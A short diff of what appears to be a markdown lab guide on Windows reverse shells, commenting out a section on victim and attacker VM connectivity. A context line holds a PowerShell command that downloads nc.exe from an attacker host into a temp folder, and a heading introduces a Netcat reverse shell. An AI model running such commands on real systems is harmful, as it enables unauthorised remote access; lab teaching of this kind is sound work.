@@ -366,7 +366,7 @@ iwr -Uri http://10.10.10.5/nc.exe -OutFile C:\Windows\Temp\nc.exe
 
 ---
 
-## Requirements
+<!-- ## Requirements
 
 The victim and attacker machines must have network connectivity.
 
@@ -388,7 +388,7 @@ Attacker VM
 
 Both machines must communicate.
 
----
+--- -->
 
 # 3. Command Prompt Reverse Shell Using Netcat
 
